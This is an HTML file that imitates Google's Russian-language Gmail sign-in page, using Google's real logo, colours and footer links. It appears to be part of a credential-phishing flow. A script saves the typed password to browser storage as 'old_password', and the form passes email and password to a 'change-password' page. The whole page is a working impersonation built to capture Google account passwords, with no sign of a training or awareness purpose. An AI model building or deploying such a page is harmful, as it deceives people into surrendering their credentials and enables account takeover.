<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Вход</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Arial; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 48px 40px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; color: #202124; }
        .form-group { margin-bottom: 20px; }
        .input-wrapper { display: flex; align-items: center; border: 1px solid #dadce0; border-radius: 8px; transition: all 0.2s; }
        .input-wrapper:focus-within { border-color: #1a73e8; border-width: 2px; }
        .input-wrapper input { width: 100%; padding: 13px 15px; border: none; outline: none; font-size: 14px; border-radius: 8px; }
        .input-wrapper input[readonly] { background: #f1f3f4; color: #5f6368; }
        .show-password { padding: 0 15px; color: #1a73e8; font-size: 14px; cursor: pointer; white-space: nowrap; }
        .forgot-link { text-align: right; margin-bottom: 32px; }
        .forgot-link a { color: #1a73e8; font-size: 14px; text-decoration: none; }
        .actions { display: flex; justify-content: flex-end; }
        .next-btn { background: #1a73e8; color: white; border: none; border-radius: 24px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .next-btn:hover { background: #1557b0; }
        .footer { margin-top: 64px; display: flex; justify-content: space-between; padding-top: 24px; border-top: 1px solid #e8eaed; font-size: 12px; color: #5f6368; }
        .language select { border: none; background: none; color: #5f6368; font-size: 12px; outline: none; cursor: pointer; }
        .footer-links { display: flex; gap: 24px; }
        .footer-links a { color: #5f6368; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png" alt="Gmail">
        </div>
        
        <h1>Вход в аккаунт Google</h1>
        
        <form id="loginForm" action="change-password.html" method="GET">
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="email" id="email" name="email" placeholder="Логин" readonly>
                </div>
            </div>
            
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Пароль" required>
                    <span class="show-password" onclick="togglePassword()">Показать</span>
                </div>
            </div>
            
            <div class="forgot-link">
                <a href="#">Забыли пароль?</a>
            </div>
            
            <div class="actions">
                <button type="submit" class="next-btn">Далее</button>
            </div>
        </form>
        
        <div class="footer">
            <div class="language">
                <select>
                    <option>Русский</option>
                    <option>English (US)</option>
                </select>
            </div>
            <div class="footer-links">
                <a href="#">Помощь</a>
                <a href="#">Конфиденциальность</a>
                <a href="#">Условия</a>
            </div>
        </div>
    </div>
    
    <script>
        function togglePassword() {
            const pwd = document.getElementById('password');
            const btn = document.querySelector('.show-password');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                btn.textContent = 'Скрыть';
            } else {
                pwd.type = 'password';
                btn.textContent = 'Показать';
            }
        }
        
        // Сохраняем пароль в localStorage перед переходом
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const password = document.getElementById('password').value;
            if (!password) {
                e.preventDefault();
                alert('Введите пароль');
            } else {
                localStorage.setItem('old_password', password);
            }
        });
    </script>
</body>
</html>
